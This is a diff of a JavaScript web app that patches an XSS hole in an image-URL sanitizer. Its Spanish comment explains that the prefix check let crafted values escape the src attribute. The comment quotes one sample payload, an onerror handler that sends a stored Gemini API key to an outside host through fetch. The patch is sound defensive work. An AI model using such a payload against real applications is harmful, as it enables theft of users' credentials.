@@ -3819,7 +3819,17 @@ const esc=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>
    solo lo que de verdad puede ser una imagen local. */
 function urlImagenSegura(u){
   const v=String(u||'');
-  return /^(data:image\/(png|jpe?g|svg\+xml|webp|gif);|blob:|logo-al3d)/i.test(v) ? v : '';
+  /* La prueba de PREFIJO no bastaba, y el comentario de arriba llevaba meses diciendo que sí.
+     Se comprobaba el principio de la cadena y se devolvía el resto CRUDO dentro de src="${...}",
+     así que un valor como
+        data:image/png;" onerror="fetch('https://…?k='+localStorage.getItem('al3d_kxs_gemini'))
+     pasaba el filtro —empieza por data:image/png;— y se salía del atributo. Es exactamente el
+     ataque que este bloque decía haber cerrado, con el mismo camino de entrada: un respaldo
+     restaurado, que el README describe llegando por WhatsApp.
+     Escapar es lo que faltaba. Nada de lo que se acepta aquí —un data:, un blob: o el nombre
+     del archivo del logotipo— contiene comillas ni ángulos, así que escaparlo no cambia
+     ninguna imagen buena y corta todas las malas. */
+  return /^(data:image\/(png|jpe?g|svg\+xml|webp|gif);|blob:|logo-al3d)/i.test(v) ? esc(v) : '';
 }
 /* El archivo analizado también puede ser un PDF, que se enseña en un <iframe>: ahí un
    javascript: sería peor todavía, porque corre en el origen de la app. */
